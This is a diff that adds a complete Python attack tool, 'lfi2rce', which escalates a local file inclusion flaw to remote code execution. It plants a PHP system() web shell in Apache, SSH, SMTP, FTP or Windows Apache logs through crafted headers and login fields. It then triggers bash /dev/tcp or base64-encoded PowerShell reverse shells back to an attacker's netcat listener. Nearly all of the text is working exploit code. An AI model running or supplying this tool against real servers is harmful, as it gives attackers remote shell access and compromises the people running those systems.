@@ -1,0 +1,293 @@
+#!/usr/bin/python3
+
+# lfi2rce (PoC) by 0bfxgh0st*
+
+import requests
+import sys
+import os
+import time
+from urllib.parse import urlparse
+import base64
+import threading
+import socket
+
+print ("lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*\n")
+
+####################################################################
+apache_file_to_poison='/var/log/apache2/access.log'                #
+ssh_file_to_poison='/var/log/auth.log'                             #
+smtp_file_to_poison='/var/log/mail.log'                            #
+ftp_file_to_poison='/var/log/vsftpd.log'                           #
+windows_apache_file_to_poison='C:/xampp/apache/logs/access.log'    #
+target_ssh_port='22'                                               #
+target_smtp_port='25'                                              #
+target_ftp_port='21'                                               #
+####################################################################
+
+def Help():
+
+	print ("Usage python3 lfi2rce -u <lfi vulnerable url> -t <poison type> -r <attacker ip> -p <attacker port>\n")
+	print ("Options:\n")
+	print ("    -u <url>")
+	print ("    -t <poison type>")
+	print ("    -r <attacker ip address>")
+	print ("    -p <attacker port>\n")
+	print ("Override default log paths:   (this will follow selected poison type schema)\n")
+	print ("    -l <log file>\n")
+	print ("Poison types:\n")
+	print ("    apache       apache2 log poison          (default path: " + apache_file_to_poison + ")")
+	print ("    ssh          ssh log poison              (default path: " + ssh_file_to_poison + ")")
+	print ("    smtp         smtp log poison             (default path: " + smtp_file_to_poison + ")")
+	print ("    ftp          ftp log poison              (default path: " + ftp_file_to_poison + ")")
+	print ("    windows      windows apache log poison   (default path: " + windows_apache_file_to_poison + ")\n")
+	print ("Examples:\n")
+	print ('    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache -r 10.0.2.15 -p 1337 -l /var/log/apache2/error.log')
+	print ('    python3 lfi2rce -u "http://ghost.server/index.php?page=" -t ssh -r 10.0.2.15 -p 1337')
+	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log')
+	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp -r 10.0.2.15 -p 1337')
+	print ('    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t windows -r 10.0.2.15 -p 1337')
+
+def autoconnect():
+
+	os.system('nc -lvp ' + attacker_port)
+	
+def linux_apache_log_poison():
+
+	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'      # m30w's with @GatoGamer1155
+	print ("💀 Poison " + apache_file_to_poison)
+	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
+	print ("💀 Sending payload\n")
+	requests.get(url + apache_file_to_poison, headers=headers)
+	c = threading.Thread(target=autoconnect)
+	c.start()
+
+	while True:
+
+		try:
+			requests.get(url + apache_file_to_poison + '&cmd=' + payload)	
+			time.sleep(1)
+	
+		except KeyboardInterrupt:
+
+			sys.exit(1)
+
+def linux_ssh_log_poison():
+
+	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
+	print ("💀 Poison " + ssh_file_to_poison)
+	print ("💀 Sending payload\n")
+	os.system("ssh '<?php system($_GET[\"cmd\"]); ?>'@" + target_host + ' -p ' + target_ssh_port)
+	c = threading.Thread(target=autoconnect)
+	c.start()
+	requests.get(url + ssh_file_to_poison + '&cmd=' + payload)
+
+def linux_smtp_log_poison():
+
+	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
+	print ("💀 Poison " + smtp_file_to_poison)
+	print ("💀 Sending payload\n")
+	os.system("{ printf \"MAIL FROM:<unknow@mail.com>\n\"; sleep 1; printf \"RCPT TO:<?php system(\$_GET['cmd']); ?>\n\"; sleep 1; } | telnet " + target_host + " " + target_smtp_port)
+	c = threading.Thread(target=autoconnect)
+	c.start()
+	requests.get(url + smtp_file_to_poison + '&cmd=' + payload)
+
+def linux_ftp_log_poison():
+
+	payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
+	print ("💀 Poison " + ftp_file_to_poison)
+
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.connect((target_host,int(target_ftp_port)))
+		data = s.recv(1024)
+		#print(data.decode('utf-8'))
+		s.sendall(b'USER <?php system($_GET["cmd"]); ?>\n')
+		data = s.recv(1024)
+		#print(data.decode('utf-8'))
+		s.sendall(b'PASS 1234\n')
+		data = s.recv(1024)
+		#print(data.decode('utf-8'))
+
+	print ("💀 Sending payload\n")
+	c = threading.Thread(target=autoconnect)
+	c.start()
+	
+	while True:
+	
+		try:
+			requests.get(url + ftp_file_to_poison + '&cmd=' + payload)
+			time.sleep(1)
+
+		except KeyboardInterrupt:
+
+			sys.exit(1)
+
+def windows_apache_log_poison():
+
+	print ("💀 Bulding encoded payload")
+	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + attacker_ip + "'," + attacker_port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
+	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
+	base64payload = bytes_encoded.decode()
+	payload = ('powershell.exe%20-ExecutionPolicy%20Bypass%20-e%20' + base64payload)
+	print ("💀 Poison " + windows_apache_file_to_poison)
+	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
+	print ("💀 Sending payload\n")
+	requests.get(url + windows_apache_file_to_poison, headers=headers)
+	c = threading.Thread(target=autoconnect)
+	c.start()
+	requests.get(url + windows_apache_file_to_poison + '&cmd=' + payload)
+
+def Main():
+
+	if '-h' in sys.argv or '--help' in sys.argv:
+
+		Help()
+		sys.exit(1)
+
+	parser = []
+	for arg in sys.argv:
+
+		parser.append(arg)
+		
+		if '-u' == arg or '--url' == arg:
+
+			urlp = int(parser.index(arg)+1)
+
+		if '-t' == arg or '--poison-type' == arg:
+
+			typep = int(parser.index(arg)+1)
+
+		if '-r' == arg or '--host' == arg:
+
+			hostp = int(parser.index(arg)+1)
+
+		if '-p' == arg or '--port' == arg:
+
+			portp = int(parser.index(arg)+1)
+			
+		if '-l' == arg or '--log' == arg:
+
+			logp = int(parser.index(arg)+1)
+
+
+	global log_poison_type
+	global attacker_ip
+	global attacker_port
+	global url
+	global target_host
+	global apache_file_to_poison
+	global ssh_file_to_poison
+	global smtp_file_to_poison
+	global ftp_file_to_poison
+	global windows_apache_file_to_poison
+	
+	try:
+	
+		log = parser[logp]
+	
+		apache_file_to_poison = log
+		ssh_file_to_poison = log
+		smtp_file_to_poison = log
+		ftp_file_to_poison = log
+		windows_apache_file_to_poison = log
+	
+	except UnboundLocalError:
+		
+		pass
+	
+	except IndexError:
+	
+		Help()
+		sys.exit(1)
+	
+	try:
+	
+		url = parser[urlp]
+		target_host = urlparse(url).netloc
+	
+	except UnboundLocalError:
+
+		pass
+		
+	except IndexError:
+
+		Help()
+		sys.exit(1)
+	
+	try:
+		attacker_ip = parser[hostp]
+		
+	except UnboundLocalError:
+
+		pass	
+
+	except IndexError:
+
+		Help()
+		sys.exit(1)
+	
+	try:
+		attacker_port = parser[portp]
+		
+	except UnboundLocalError:
+
+		pass
+		
+	except IndexError:
+
+		Help()
+		sys.exit(1)
+
+	try:
+	
+		log_poison_type = parser[typep]
+	
+	except UnboundLocalError:
+
+		pass
+	
+	except IndexError:
+
+		Help()
+		sys.exit(1)
+	
+if len(sys.argv) < 9:
+
+	Help()
+	sys.exit(1)
+
+Main()
+
+try:
+
+	if log_poison_type == 'apache':
+
+		linux_apache_log_poison()
+
+	elif log_poison_type == 'ssh':
+
+		linux_ssh_log_poison()
+
+	elif log_poison_type == 'smtp':
+
+		linux_smtp_log_poison()
+
+	elif log_poison_type == 'ftp':
+
+		linux_ftp_log_poison()
+
+	elif log_poison_type == 'windows':
+
+		windows_apache_log_poison()
+
+	else:
+
+		print("No poison scheme found")
+
+except NameError:
+
+	Help()
+	sys.exit(1)
+
+except KeyboardInterrupt:
+
+	sys.exit(1)
